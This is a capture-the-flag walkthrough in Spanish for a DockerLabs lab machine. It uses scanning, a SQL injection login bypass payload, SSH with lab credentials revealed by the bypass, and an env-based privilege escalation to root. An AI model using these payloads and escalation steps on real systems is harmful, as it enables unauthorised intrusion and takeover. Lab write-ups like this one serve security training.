#Injection DockerLabs - 14/05/2024

#web - https://dockerlabs.es/#/

Empezamos con un escaneo basico de nmap:

```shell
└─$ nmap -sVC -p- -n --min-rate 5000 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 20:23 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00021s latency).
All 65535 scanned ports on 172.17.0.2 are in ignored states.
Not shown: 65535 closed tcp ports (conn-refused)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds

```

Realizamos un escaneo de subdominios con gobuster hacia "http://172.17.0.2":

```shell
└─$ gobuster dir -u "http://172.17.0.2/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,py,bak        
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,py,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 2921]
/config.php           (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================

```

Entramos en "http://172.17.0.2/index.php/" y vemos que hay un login web.
Intentamos bypassearlo utilizando la vunerabilidad "sql injection":

```shell
' or 1=1; --
```

![Captura de pantalla 2024-05-14 195628](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/5da299de-f3ce-4ad0-a18f-b7c21ab565af)

Logramos bypassearlo y vemos un usuario "Dylan" y una contraseña "KJSDFG789FGSDF78":

![Captura de pantalla 2024-05-14 195654](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/6d613173-33fe-46f4-9d63-420a7895c706)

Introduciomos estos datos en el servidor ssh:


```shell                                                                   
└─$ ssh dylan@172.17.0.2                                                                                                  
dylan@172.17.0.2's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.6.9-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

```

Buscamos binarios con permisos SUID

```shell
dylan@37ab85f5f7a7:~$ find / -perm -4000 -user root 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/chsh
/usr/bin/env
/usr/bin/su
/usr/bin/chfn
/usr/bin/passwd

```

Buscamos el binario env en "https://gtfobins.github.io/gtfobins/env/".
Ejecutamos el comando de la web:

```shell
sudo env /bin/sh
```

```shell
# whoami
root
```
